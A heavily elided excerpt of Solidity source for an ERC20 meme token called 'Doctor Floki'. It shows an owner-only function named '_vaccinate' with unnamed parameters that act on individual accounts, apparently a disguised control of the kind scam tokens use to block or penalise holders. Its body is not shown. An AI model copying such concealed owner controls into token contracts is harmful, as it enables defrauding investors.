...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _vaccinate(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20DoctorFloki is Context, ERC20 {
    constructor(
...
contract DoctorFloki is ERC20DoctorFloki {
    constructor() ERC20DoctorFloki("Doctor Floki", "DocFLOKI", false, true, 1100, 20, msg.sender, 200000000 * 10 ** 18, msg.sender, 4) {
    }
}